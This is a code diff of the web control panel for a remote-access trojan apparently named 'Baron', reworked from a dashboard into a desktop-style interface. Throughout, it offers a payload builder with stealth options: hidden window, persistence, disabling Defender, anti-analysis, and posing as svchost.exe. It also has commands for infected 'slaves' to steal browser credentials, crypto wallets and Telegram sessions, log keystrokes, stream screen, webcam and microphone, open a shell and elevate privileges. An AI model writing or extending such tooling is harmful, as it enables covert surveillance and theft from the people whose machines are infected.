-              <div style="flex:1"><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px;">Type</label><select id="b-type" class="input" style="cursor:pointer;"><option value="exe">Executable (.exe)</option><option value="source">C# Source (.cs)</option></select></div>
-              <div style="flex:1"><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px;">Beacon (ms)</label><input type="number" id="b-beacon" class="input" value="5000"></div>
-            </div>
-            <div style="margin-top:20px;"><button class="btn btn-prime" style="width:100%;" onclick="buildAgent()">FORGE PAYLOAD</button></div>
-          </div>
-          <div style="flex:1; background:rgba(0,0,0,0.5); border-radius:16px; padding:24px; border:1px solid rgba(255,255,255,0.05);">
-            <div style="font-size:0.8rem; letter-spacing:3px; color:var(--gold); margin-bottom:16px; text-transform:uppercase;">Mutations</div>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Hidden Window</span><input type="checkbox" id="b-hidden" checked></label>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Registry Persistence</span><input type="checkbox" id="b-persist"></label>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Anti-Kill Watchdog</span><input type="checkbox" id="b-antikill"></label>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Disable Defender</span><input type="checkbox" id="b-defender"></label>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Anti-Analysis (VM)</span><input type="checkbox" id="b-antianalysis"></label>
-            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span style="color:var(--gold);">Debug Mode</span><input type="checkbox" id="b-debug"></label>
-          </div>
-        </div>
-        <div id="build-out" style="display:none; margin-top:30px;">
-          <div class="terminal">
-            <div class="term-bar"><div class="term-dot" style="background:#ff3b5c"></div><div class="term-dot" style="background:#D4AF37"></div><div class="term-dot" style="background:#00ff88"></div><span style="font-size:0.7rem; color:var(--text-dim); margin-left:10px;">Compiler Output</span></div>
-            <div class="term-body" id="build-src" style="height:250px;"></div>
-          </div>
-          <button class="btn btn-prime" style="margin-top:16px;" onclick="downloadBuild()">DOWNLOAD TARGET</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- Streams -->
-    <div id="page-streams" class="page">
-      <div class="glass-box">
-        <div class="box-title">Live Intel Streams 
-          <select id="stream-cid" class="input" style="width:auto; padding:8px 16px; border-radius:30px;"><option value="">— Select Node —</option></select>
-        </div>
-        <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
-          <div style="background:#000; border:1px solid var(--border); border-radius:16px; height:300px; display:flex; align-items:center; justify-content:center; color:var(--text-dim); overflow:hidden;" id="screen-frame">Desktop Feed</div>
-          <div style="background:#000; border:1px solid var(--border); border-radius:16px; height:300px; display:flex; align-items:center; justify-content:center; color:var(--text-dim); overflow:hidden;" id="webcam-frame">Optical Feed</div>
-        </div>
-        <div style="margin-top:20px; display:flex; gap:12px; flex-wrap:wrap;">
-          <button class="btn btn-ghost" onclick="sendStream('screen_start')">INIT SCREEN</button>
-          <button class="btn btn-danger" onclick="sendStream('screen_stop')">HALT SCREEN</button>
-          <button class="btn btn-ghost" onclick="sendStream('webcam_start')">INIT OPTICS</button>
-          <button class="btn btn-danger" onclick="sendStream('webcam_stop')">HALT OPTICS</button>
-          <button class="btn btn-prime" onclick="sendStream('audio_start')">INIT AUDIO</button>
-          <button class="btn btn-danger" onclick="sendStream('audio_stop')">HALT AUDIO</button>
-        </div>
-      </div>
-    </div>
-
-  </main>
-
-  <!-- Right Panel: Logs -->
-  <aside class="panel" id="right-panel">
-    <div class="rp-header">System Telemetry</div>
-    <div class="log-stream" id="log-body">
-      <!-- Logs populate here -->
-      <div style="text-align:center; color:var(--text-dim); margin-top:50px;">Awaiting telemetry...</div>
-    </div>
-  </aside>
-
-</div>
-
-<!-- Context Menu -->
-<div id="ctx-menu">
-  <div class="ctx-header">Node: <span id="ctx-cid" style="color:#fff;"></span></div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-item" onclick="ctxCmd('sysinfo')">Get System Info</div>
-  <div class="ctx-item" onclick="ctxCmd('netscan')">Scan Local Subnet</div>
-  <div class="ctx-item" onclick="ctxCmd('browser_creds')">Extract Vault / Browsers</div>
-  <div class="ctx-item" onclick="ctxCmd('crypto_wallet')">Extract Crypto Wallets</div>
-  <div class="ctx-item" onclick="ctxCmd('telegram')">Extract Telegram Session</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">C2 Link</div>
-  <div class="ctx-item" onclick="nav(document.querySelector('[onclick=\'nav(this,\\\'streams\\\')\']'), 'streams')">Initialize Stream / Audio</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-item ctx-danger" onclick="ctxCmd('uninstall')">Purge / Uninstall Payload</div>
-  <div class="ctx-item ctx-danger" onclick="ctxCmd('kill_agent')">Sever Connection (Kill)</div>
-</div>
-
-<!-- Modal (Legacy Alerts and Terminals) -->
-<div id="modal-overlay" style="position:fixed; inset:0; z-index:9500; background:rgba(0,0,0,0.8); backdrop-filter:blur(20px); display:none; align-items:center; justify-content:center;">
-  <div class="panel" style="width:700px; padding:30px;">
-    <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
-      <h3 id="modal-title" style="color:var(--gold);">Terminal Control</h3>
-      <button class="btn btn-ghost" style="padding:4px 12px;" onclick="closeModal()">X</button>
-    </div>
-    <div id="modal-body"></div>
   </div>
-</div>
 
+  <div id="os-desktop"></div>
+
+  <div id="os-dock" style="display:none;">
+    <div class="dock-item" data-tooltip="Dashboard" onclick="openApp('dashboard')">👑</div>
+    <div class="dock-separator"></div>
+    <div class="dock-item" data-tooltip="Network" onclick="openApp('network')">🌐</div>
+    <div class="dock-item" data-tooltip="Forge Payload" onclick="openApp('builder')">⚒️</div>
+    <div class="dock-item" data-tooltip="Telemetry" onclick="openApp('telemetry')">📜</div>
+    <div class="dock-separator"></div>
+    <div class="dock-item" data-tooltip="Settings" onclick="openApp('settings')">⚙️</div>
+    <div class="dock-item" data-tooltip="Lock Session" onclick="doLogout()">🔒</div>
+  </div>
+
+  <!-- Context Menu (15 Hardcore Functions) -->
+  <div id="ctx-menu">
+    <div class="ctx-header" id="ctx-agent-id">Agent: ???</div>
+    
+    <div class="ctx-category">Surveillance</div>
+    <div class="ctx-item" onclick="ctxAction('screen')">Live Screen Stream <span>👁️</span></div>
+    <div class="ctx-item" onclick="ctxAction('webcam')">Live Webcam Feed <span>📷</span></div>
+    <div class="ctx-item" onclick="ctxAction('mic')">Live Microphone <span>🎤</span></div>
+    <div class="ctx-item" onclick="ctxAction('keylogger')">Keylogger Online <span>⌨️</span></div>
+
+    <div class="ctx-category">Data Extraction</div>
+    <div class="ctx-item" style="color:#d4af37;" onclick="ctxAction('grabber')">Ultimate Grabber <span>💰</span></div>
+    <div class="ctx-item" onclick="ctxAction('files')">File Explorer <span>📁</span></div>
+    <div class="ctx-item" onclick="ctxAction('clipboard')">Clipboard Viewer <span>📋</span></div>
+
+    <div class="ctx-category">System Control</div>
+    <div class="ctx-item" onclick="ctxAction('shell')">Interactive Shell <span>>_</span></div>
+    <div class="ctx-item" onclick="ctxAction('regedit')">Registry Editor <span>🔧</span></div>
+    <div class="ctx-item" onclick="ctxAction('processes')">Task Manager <span>📊</span></div>
+    <div class="ctx-item" onclick="ctxAction('netstat')">Netstat <span>🕸️</span></div>
+    <div class="ctx-item danger" onclick="ctxAction('power')">Power Control <span>⚡</span></div>
+
+    <div class="ctx-category">Survival</div>
+    <div class="ctx-item danger" onclick="ctxAction('inject')">Melt & Migrate <span>💉</span></div>
+    <div class="ctx-item danger" onclick="ctxAction('defender')">Silence Defender <span>🛡️</span></div>
+    <div class="ctx-item danger" onclick="ctxAction('uac')">UAC Elevate <span>👑</span></div>
+  </div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
 <script>
-// ─── Three.js 3D Cyber Web Background ───
-let scene, camera, renderer, particles;
-function init3D() {
-  scene = new THREE.Scene();
-  scene.fog = new THREE.FogExp2(0x020305, 0.001);
-  camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 1, 2000);
-  camera.position.z = 1000;
-  renderer = new THREE.WebGLRenderer({ alpha:true, antialias:true });
-  renderer.setSize(window.innerWidth, window.innerHeight);
-  document.getElementById('three-canvas').appendChild(renderer.domElement);
-
-  const geometry = new THREE.BufferGeometry();
-  const vertices = [];
-  for(let i=0; i<1500; i++){
-    vertices.push((Math.random()-0.5)*3000, (Math.random()-0.5)*3000, (Math.random()-0.5)*3000);
-  }
-  geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
-  
-  // Custom texture for glow
-  const canvas = document.createElement('canvas'); canvas.width = 16; canvas.height = 16;
-  const ctx = canvas.getContext('2d');
-  const gradient = ctx.createRadialGradient(8,8,0,8,8,8);
-  gradient.addColorStop(0, 'rgba(255,255,255,1)'); gradient.addColorStop(1, 'rgba(255,255,255,0)');
-  ctx.fillStyle = gradient; ctx.fillRect(0,0,16,16);
-  const texture = new THREE.CanvasTexture(canvas);
-
-  const material = new THREE.PointsMaterial({
-    size: 20, map: texture, transparent: true, opacity: 0.6,
-    blending: THREE.AdditiveBlending, depthWrite: false, color: 0xD4AF37
-  });
-  particles = new THREE.Points(geometry, material);
-  scene.add(particles);
-
-  window.addEventListener('resize', () => {
-    camera.aspect = window.innerWidth/window.innerHeight; camera.updateProjectionMatrix();
-    renderer.setSize(window.innerWidth, window.innerHeight);
-  });
-  
-  let mouseX = 0, mouseY = 0;
-  document.addEventListener('mousemove', e => {
-    mouseX = (e.clientX - window.innerWidth/2) * 2;
-    mouseY = (e.clientY - window.innerHeight/2) * 2;
-  });
-
-  function animate() {
-    requestAnimationFrame(animate);
-    particles.rotation.x += 0.0005; particles.rotation.y += 0.001;
-    camera.position.x += (mouseX - camera.position.x) * 0.05;
-    camera.position.y += (-mouseY - camera.position.y) * 0.05;
-    camera.lookAt(scene.position);
-    // Update color based on theme
-    const goldHex = getComputedStyle(document.documentElement).getPropertyValue('--gold').trim();
-    if(goldHex) material.color.set(goldHex);
-    renderer.render(scene, camera);
-  }
-  animate();
-}
-// ────────────────────────────────────────
-
+// --- GLOBALS ---
 let TOKEN = localStorage.getItem('bt') || '';
-let CLIENTS = {}, SELECTED_CID = null, socket = null, BUILD_DATA = null;
+let socket = null;
+let STATE = { clients: {}, tasks: {}, logs: [] };
+let selectedAgent = null;
 
-window.onload = () => {
-  init3D();
-  const savedTheme = localStorage.getItem('baron-theme');
-  if(savedTheme) setTheme(savedTheme);
-  if(TOKEN) { 
-    document.getElementById('login').style.opacity = '0';
-    setTimeout(() => { document.getElementById('login').style.display = 'none'; document.getElementById('hud').style.display = 'flex'; }, 800);
-    initSocket(); fetchAll(); 
-  }
-};
-
-setInterval(() => {
-  const c = document.getElementById('clock');
-  if(c) c.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
-}, 1000);
-
-// Continuous Telemetry Sync
-setInterval(() => { if (TOKEN && document.getElementById('hud').style.display === 'flex') fetchAll(); }, 3000);
-
-function setTheme(name) {
-  document.documentElement.setAttribute('data-theme', name);
-  localStorage.setItem('baron-theme', name);
-}
+// --- AUTH ---
+document.getElementById('p').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
 
 async function doLogin() {
-  const user = document.getElementById('u').value, pwd = document.getElementById('p').value;
+  const u = document.getElementById('u').value.trim();
+  const p = document.getElementById('p').value;
   const res = await fetch('/api/panel/login', {
-    method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({login:user, password:pwd})
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({login: u, password: p}) /* Fixed parameter mapping */
   }).then(r => r.json()).catch(() => null);
+
   if (res && res.token) {
     TOKEN = res.token; localStorage.setItem('bt', TOKEN);
-    document.getElementById('login').style.opacity = '0';
-    setTimeout(() => { document.getElementById('login').style.display = 'none'; document.getElementById('hud').style.display = 'flex'; }, 800);
-    initSocket(); fetchAll();
+    document.getElementById('login-screen').style.opacity = '0';
+    setTimeout(() => { 
+      document.getElementById('login-screen').style.display = 'none'; 
+      document.getElementById('os-dock').style.display = 'flex';
+      initOS();
+    }, 800);
   } else {
-    document.getElementById('login-err').textContent = 'ACCESS DENIED';
+    document.getElementById('login-err').textContent = (res&&res.error) ? res.error : "Access Denied.";
   }
 }
 
-function logout() {
-  fetch('/api/panel/logout', {method:'POST', headers:{'X-Token':TOKEN}});
+function doLogout() {
   localStorage.removeItem('bt'); location.reload();
 }
 
-async function apiFetch(url, opts = {}) {
-  opts.headers = opts.headers || {}; opts.headers['X-Token'] = TOKEN;
-  const r = await fetch(url, opts).catch(() => null);
-  if (!r) return null;
-  if (r.status === 401) { logout(); return null; }
-  return r.json().catch(() => null);
+async function api(path, opts={}) {
+  opts.headers = opts.headers || {};
+  opts.headers['X-Token'] = TOKEN;
+  const r = await fetch(path, opts);
+  if (r.status === 401) doLogout();
+  return r.json();
 }
 
-function nav(el, page) {
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  el.classList.add('active');
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(`page-${page}`).classList.add('active');
-  document.getElementById('pg-title').textContent = el.textContent.trim();
+// --- OS INITIALIZATION ---
+function initOS() {
+  initSocket();
+  fetchAll(true);
+  setInterval(() => fetchAll(false), 3000); // UI polling backing up sockets
+  
+  // Open default apps
+  openApp('network', { width: 700, height: 400, x: 50, y: 50 });
+  openApp('telemetry', { width: 500, height: 400, x: 800, y: 50 });
 }
 
-// ── Rendering & Sync
-async function fetchAll() {
-  const d = await apiFetch('/api/panel/clients');
-  if (!d || !d.ok) return;
-  CLIENTS = d.clients || {};
-  renderStats(d); renderTables(); populateStreamSelect();
+function initSocket() {
+  socket = io();
+  socket.on('connect', () => console.log('OS Uplink Established.'));
+  socket.on('disconnect', () => console.log('OS Uplink Lost.'));
+  // Bind updates
+  socket.on('client_new', c => fetchAll(false));
+  socket.on('client_offline', c => fetchAll(false));
+  socket.on('log', l => {
+    STATE.logs.push(l.msg);
+    if(STATE.logs.length>100) STATE.logs.shift();
+    updateTelemetryView(true);
+  });
+  socket.on('stream_frame', f => {
+    const el = document.getElementById(`stream-img-${f.id}`);
+    if (el) el.src = "data:image/jpeg;base64," + f.b64;
+  });
 }
 
-function renderStats(d) {
-  const clients = Object.values(CLIENTS);
-  const online = clients.filter(c => (Date.now()/1000 - (c.last_seen||0)) < 300).length;
-  document.getElementById('s-total').textContent = clients.length;
-  document.getElementById('s-online').textContent = online;
-  document.getElementById('s-tasks').textContent = d.tasks || 0;
-  const up = d.uptime || 0;
-  document.getElementById('s-uptime').textContent = Math.floor(up/3600) ? `${Math.floor(up/3600)}h` : `${Math.floor((up%3600)/60)}m`;
-  document.getElementById('badge-online').innerHTML = `<span class="dot"></span>${online} ONLINE`;
-  renderLogs(d.logs || []);
+async function fetchAll(forceOpen=false) {
+  const data = await api('/api/panel/clients');
+  if(!data||!data.ok) return;
+  STATE.clients = data.clients;
+  STATE.logs = data.logs;
+  updateNetworkView();
+  updateTelemetryView(false);
+  if(document.getElementById('app-dashboard')) updateDashboardView();
 }
 
-function timeSince(ts) {
-  if (!ts) return '—'; const s = Math.floor(Date.now()/1000 - ts);
-  if (s < 60) return `${s}s`; if (s < 3600) return `${Math.floor(s/60)}m`; return `${Math.floor(s/3600)}h`;
+// --- WINDOW MANAGER ---
+let zIndexCounter = 100;
+
+function createWindow(opts) {
+  const wid = opts.id || 'win_' + Math.random().toString(36).substr(2,9);
+  
+  // Focus existing if exists
+  if(document.getElementById(wid)) {
+    focusWindow(document.getElementById(wid));
+    return document.getElementById(wid);
+  }
+
+  const w = document.createElement('div');
+  w.className = 'os-window active';
+  w.id = wid;
+  w.style.width = (opts.width || 600) + 'px';
+  w.style.height = (opts.height || 400) + 'px';
+  w.style.left = (opts.x || (window.innerWidth/2 - (opts.width||600)/2 + (Math.random()*40-20))) + 'px';
+  w.style.top = (opts.y || (window.innerHeight/2 - (opts.height||400)/2 + (Math.random()*40-20))) + 'px';
+  w.style.zIndex = ++zIndexCounter;
+
+  w.innerHTML = `
+    <div class="os-titlebar" onmousedown="startDrag(event, '${wid}')">
+      <div class="os-title">${opts.title || 'Window'}</div>
+      <div class="os-controls">
+        <button class="os-btn btn-max" onclick="maxWindow('${wid}')"></button>
+        <button class="os-btn btn-close" onclick="closeWindow('${wid}')"></button>
+      </div>
+    </div>
+    <div class="os-content" id="${wid}-content">
+      ${opts.html || ''}
+    </div>
+    <div class="os-resize" onmousedown="startResize(event, '${wid}')"></div>
+  `;
+
+  w.onmousedown = () => focusWindow(w);
+  document.getElementById('os-desktop').appendChild(w);
+  
+  if(opts.onInit) opts.onInit(w, `${wid}-content`);
+  return w;
 }
 
-function isOnline(c) { return (Date.now()/1000 - (c.last_seen||0)) < 300; }
-
-function renderTables() {
-  const tk = Object.keys(CLIENTS);
-  document.getElementById('client-table').innerHTML = tk.length ? tk.map(k => {
-    const c = CLIENTS[k], on = isOnline(c);
-    const m = on ? `<span class="pill pill-on"><span class="dot"></span>ONLINE</span>` : `<span class="pill pill-off"><span class="dot"></span>OFFLINE</span>`;
-    return `<tr oncontextmenu="showContextMenu(event, '${k}')" style="cursor:context-menu">
-      <td style="font-family:var(--mono); color:var(--text-dim);">${k.substring(0,8)}</td>
-      <td>${c.hostname||'—'}</td><td>${(c.os||'').substring(0,25)}</td><td>${c.internal_ip||c.ip||'—'}</td>
-      <td>${m}</td><td>${timeSince(c.last_seen)}</td></tr>`;
-  }).join('') : '<tr><td colspan="6" style="text-align:center; padding:40px; color:var(--text-dim)">No Active Nodes</td></tr>';
-
-  document.getElementById('agent-table').innerHTML = tk.length ? tk.map(k => {
-    const c = CLIENTS[k], on = isOnline(c);
-    const m = on ? `<span style="color:var(--green)">Online</span>` : `<span style="color:var(--red)">Offline</span>`;
-    return `<tr oncontextmenu="showContextMenu(event, '${k}')" style="cursor:context-menu">
-      <td style="font-family:var(--mono); color:var(--text-dim);">${k.substring(0,8)}</td>
-      <td>${c.hostname||'—'}</td><td>${c.user||'—'}</td><td>${c.ip||'—'}</td>
-      <td>${c.country||'—'}</td><td>${c.av||'—'}</td><td>${m}</td></tr>`;
-  }).join('') : '<tr><td colspan="7" style="text-align:center; padding:40px; color:var(--text-dim)">Database Empty</td></tr>';
+function focusWindow(w) {
+  document.querySelectorAll('.os-window').forEach(el => el.classList.remove('active'));
+  w.classList.add('active');
+  w.style.zIndex = ++zIndexCounter;
 }
 
-function renderLogs(logs) {
-  const el = document.getElementById('log-body');
-  if(!el) return;
-  el.innerHTML = [...logs].reverse().slice(0,50).map(l => {
-    const t = l.time ? new Date(l.time*1000).toLocaleTimeString() : '';
-    const cls = l.level==='warn'?'log-warn':(l.level==='error'?'log-error':'log-info');
-    return `<div class="log-entry ${cls}"><span class="log-time">${t}</span><span class="log-msg">${l.msg}</span></div>`;
-  }).join('');
-}
-
-// ── Context Menu
-function showContextMenu(e, cid) {
-  e.preventDefault(); SELECTED_CID = cid;
-  document.getElementById('ctx-cid').textContent = cid.substring(0,8);
-  const m = document.getElementById('ctx-menu');
-  m.style.left = e.pageX + 'px'; m.style.top = e.pageY + 'px';
-  m.classList.add('show');
-}
-document.addEventListener('click', () => document.getElementById('ctx-menu').classList.remove('show'));
-
-function ctxCmd(cmd) { sendCommand({action:cmd}); }
-async function sendCommand(taskObj) {
-  if (!SELECTED_CID) return;
-  const r = await apiFetch('/api/panel/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cid:SELECTED_CID, task:taskObj})});
-  if (r && r.ok) { let l=document.getElementById('log-body'); if(l) l.innerHTML=`<div class="log-entry log-info"><span class="log-msg" style="color:var(--gold)">Command [${taskObj.action}] dispatched to node ${SELECTED_CID.substring(0,8)}</span></div>` + l.innerHTML; }
-}
-
-// ── Stream
-function populateStreamSelect() {
-  const sel = document.getElementById('stream-cid');
-  sel.innerHTML = '<option value="">— Select Node —</option>' + Object.keys(CLIENTS).map(k => `<option value="${k}">${CLIENTS[k].hostname || 'Unknown'} (${k.substring(0,8)})</option>`).join('');
-}
-function sendStream(action) {
-  const cid = document.getElementById('stream-cid').value;
-  if(!cid) return alert('Select Node first');
-  SELECTED_CID = cid; sendCommand({action});
-}
-
-// ── Builder
-async function buildAgent() {
-  const opts = {
-    server: document.getElementById('b-server').value, name: document.getElementById('b-name').value,
-    beacon: parseInt(document.getElementById('b-beacon').value) || 5000, output_type: document.getElementById('b-type').value,
-    hidden: document.getElementById('b-hidden').checked, persist: document.getElementById('b-persist').checked,
-    anti_kill: document.getElementById('b-antikill').checked, disable_defender: document.getElementById('b-defender').checked,
-    anti_analysis: document.getElementById('b-antianalysis').checked, debug: document.getElementById('b-debug').checked
-  };
-  const r = await apiFetch('/api/panel/build', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(opts)});
-  if (!r) return;
-  document.getElementById('build-out').style.display='block';
-  if (r.ok) {
-    BUILD_DATA = r;
-    const txt = (r.compile_status==='success') ? `✅ COMPILED\nDownload: ${r.download_url}\n` : `⚠ COMPILER STATUS: ${r.compile_status}\n`;
-    document.getElementById('build-src').textContent = txt + (r.source||'');
-  } else document.getElementById('build-src').textContent = 'Error: ' + (r.error||'');
-}
-async function downloadBuild() {
-  if(!BUILD_DATA) return;
-  if(BUILD_DATA.download_url) {
-    const resp = await fetch(BUILD_DATA.download_url,{headers:{'X-Token':TOKEN}});
-    if(resp.ok) {
-      const a = document.createElement('a'); a.href = URL.createObjectURL(await resp.blob()); a.download = (BUILD_DATA.name||'agent')+'.exe'; a.click();
-    }
-  } else {
-    const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([BUILD_DATA.source||''],{type:'text/plain'})); a.download = (BUILD_DATA.name||'agent')+'.cs'; a.click();
+function closeWindow(wid) {
+  const w = document.getElementById(wid);
+  if(w) {
+    w.style.transform = 'scale(0.95)'; w.style.opacity = '0';
+    setTimeout(() => w.remove(), 200);
   }
 }
 
-// ── Socket
-function initSocket() {
-  socket = io({auth:{token:TOKEN}}); socket.emit('auth', {token:TOKEN});
-  let audioCtx = null;
-  socket.on('stream_frame', d => {
-    const el = document.getElementById(d.type==='screen' ? 'screen-frame' : 'webcam-frame');
-    if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
-  });
-  socket.on('audio_chunk', async d => {
-    if(!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
-    if(audioCtx.state==='suspended') await audioCtx.resume();
-    const binary = atob(d.data); const bytes = new Uint8Array(binary.length);
-    for(let i=0;i<binary.length;i++) bytes[i]=binary.charCodeAt(i);
-    const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
-    const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
+function maxWindow(wid) {
+  const w = document.getElementById(wid);
+  if(!w) return;
+  if(w.dataset.maximized) {
+    w.style.left = w.dataset.x; w.style.top = w.dataset.y;
+    w.style.width = w.dataset.w; w.style.height = w.dataset.h;
+    delete w.dataset.maximized;
+  } else {
+    w.dataset.x = w.style.left; w.dataset.y = w.style.top;
+    w.dataset.w = w.style.width; w.dataset.h = w.style.height;
+    w.style.left = '0px'; w.style.top = '0px';
+    w.style.width = '100vw'; w.style.height = 'calc(100vh - 80px)'; // leave dock space
+    w.dataset.maximized = "1";
+  }
+}
+
+// Drag & Resize Mechanics
+let _dragObj = null, _dragOffset = {x:0, y:0}, _isResize = false;
+function startDrag(e, wid) {
+  if(e.target.closest('.os-controls')) return;
+  _dragObj = document.getElementById(wid); _isResize = false;
+  const rect = _dragObj.getBoundingClientRect();
+  _dragOffset.x = e.clientX - rect.left;
+  _dragOffset.y = e.clientY - rect.top;
+  focusWindow(_dragObj);
+}
+function startResize(e, wid) {
+  _dragObj = document.getElementById(wid); _isResize = true;
+  _dragOffset.startX = e.clientX; _dragOffset.startY = e.clientY;
+  _dragOffset.startW = _dragObj.offsetWidth; _dragOffset.startH = _dragObj.offsetHeight;
+  e.stopPropagation(); focusWindow(_dragObj);
+}
+
+document.addEventListener('mousemove', e => {
+  if(!_dragObj) return;
+  if(_isResize) {
+    const w = _dragOffset.startW + (e.clientX - _dragOffset.startX);
+    const h = _dragOffset.startH + (e.clientY - _dragOffset.startY);
+    _dragObj.style.width = Math.max(300, w) + 'px';
+    _dragObj.style.height = Math.max(200, h) + 'px';
+  } else {
+    _dragObj.style.left = (e.clientX - _dragOffset.x) + 'px';
+    _dragObj.style.top = (e.clientY - _dragOffset.y) + 'px';
+  }
+});
+document.addEventListener('mouseup', () => { _dragObj = null; });
+
+// --- APPS ---
+const APPS = {
+  dashboard: {
+    id: 'app-dashboard', title: 'Baron Dashboard',
+    html: `
+      <div class="dash-grid">
+        <div class="dash-card"><div class="dash-val" id="d-total">0</div><div class="dash-lbl">Total Slaves</div></div>
+        <div class="dash-card"><div class="dash-val" id="d-online" style="color:var(--success);">0</div><div class="dash-lbl">Online</div></div>
+        <div class="dash-card" style="grid-column: 1 / -1;"><div class="dash-val" id="d-tasks">0</div><div class="dash-lbl">Pending Tasks</div></div>
+      </div>
+    `,
+    onInit: () => updateDashboardView()
+  },
+  network: {
+    id: 'app-network', title: 'Network Overseer', width: 700, height: 400,
+    html: `
+      <table>
+        <thead><tr><th>Status</th><th>ID</th><th>Host \\ User</th><th>OS</th><th>Version</th></tr></thead>
+        <tbody id="agent-list"></tbody>
+      </table>
+    `,
+    onInit: () => updateNetworkView()
+  },
+  builder: {
+    id: 'app-builder', title: 'Forge Payload', width: 650, height: 450,
+    html: `
+      <div class="builder-grid">
+        <div class="builder-section">
+          <h3>Connection</h3>
+          <div class="b-row"><label>Server URL</label><input type="text" id="b-sv" value="https://example.com"></div>
+          <div class="b-row"><label>Beacon Interval (ms)</label><input type="number" id="b-beacon" value="5000"></div>
+          <div class="b-row"><label>Anti-Analysis</label><select id="b-aa"><option value="true">Enabled</option><option value="false">Disabled</option></select></div>
+        </div>
+        <div class="builder-section">
+          <h3>Stealth / Install</h3>
+          <div class="b-row"><label>Process Name</label><input type="text" id="b-proc" value="svchost.exe"></div>
+          <div class="b-row"><label>Melt (Self-Delete)</label><select id="b-melt"><option value="false">No</option><option value="true">Yes</option></select></div>
+          <div class="b-row"><label>Persistence</label><select id="b-pers"><option value="true">Enabled</option><option value="false">Disabled</option></select></div>
+          <div class="b-row"><label>Anti-Kill (Critical Process)</label><select id="b-kill"><option value="false">Disabled</option><option value="true">Enabled</option></select></div>
+        </div>
+      </div>
+      <div style="text-align:right; margin-top:20px;">
+        <button class="gold-btn" style="padding: 10px 30px;" onclick="buildAgent()">FORGE AGENT</button>
+      </div>
+      <p id="b-status" style="margin-top:10px; color:var(--highlight);"></p>
+    `
+  },
+  telemetry: {
+    id: 'app-telemetry', title: 'System Telemetry', width: 500, height: 400,
+    html: `<div id="log-container" style="height:100%; overflow:auto; display:flex; flex-direction:column-reverse;"></div>`,
+    onInit: () => updateTelemetryView(true)
+  }
+};
+
+function openApp(appName, customOpts={}) {
+  const app = APPS[appName];
+  createWindow({ ...app, ...customOpts });
+}
+
+// APP LOGIC
+function updateDashboardView() {
+  if(!document.getElementById('d-total')) return;
+  const vals = Object.values(STATE.clients);
+  document.getElementById('d-total').textContent = vals.length;
+  document.getElementById('d-online').textContent = vals.filter(c => c.online).length;
+}
+
+function updateNetworkView() {
+  const tbody = document.getElementById('agent-list');
+  if(!tbody) return;
+  tbody.innerHTML = '';
+  Object.values(STATE.clients).forEach(c => {
+    const tr = document.createElement('tr');
+    tr.className = 'agent-row';
+    tr.innerHTML = `
+      <td><span class="status-dot ${c.online?'':'offline'}"></span>${c.online?'Online':'Offline'}</td>
+      <td style="font-family:var(--font-mono); color:var(--highlight);">${c.id.substr(0,8)}</td>
+      <td>${c.hostname} \\ ${c.username}</td>
+      <td>${c.os}</td>
+      <td>${c.version}</td>
+    `;
+    tr.oncontextmenu = (e) => showCtx(e, c);
+    tbody.appendChild(tr);
   });
 }
 
-// ── Drag & Drop Stat Grid
-document.addEventListener('DOMContentLoaded', () => {
-    const cont = document.getElementById('stats-container');
-    if(!cont) return;
-    let dragged = null;
-    let o = null; try{o = JSON.parse(localStorage.getItem('baron-v2-stats'))}catch(e){}
-    if(o && o.length){
-        const stats = [...cont.querySelectorAll('.stat-card')];
-        o.forEach(id=>{ const r=stats.find(s=>s.querySelector('.stat-val').id===id); if(r) cont.appendChild(r); });
+function updateTelemetryView(autoScroll=false) {
+  const cont = document.getElementById('log-container');
+  if(!cont) return;
+  let html = '';
+  // Reverse loop since column-reverse displays bottom up
+  let revLogs = [...STATE.logs].reverse();
+  revLogs.forEach(l => {
+    let typeClass = 'log-info';
+    if(l.includes('Failed') || l.includes('warn')) typeClass = 'log-warn';
+    if(l.includes('Error') || l.includes('FATAL') || l.includes('Exception')) typeClass = 'log-err';
+    if(l.includes('Command')) typeClass = 'log-cmd';
+    
+    // Attempt parse time "HH:MM:SS - "
+    let t = '', m = l;
+    if(/^[0-9]{2}:[0-9]{2}:[0-9]{2}/.test(l)) {
+      t = l.substr(0,8); m = l.substr(11);
     }
-    cont.querySelectorAll('.stat-card').forEach(s => {
-        s.addEventListener('dragstart', function(){ dragged=this; setTimeout(()=>this.style.opacity='0.4',0); });
-        s.addEventListener('dragend', function(){ 
-            setTimeout(()=>{ this.style.opacity='1'; dragged=null; 
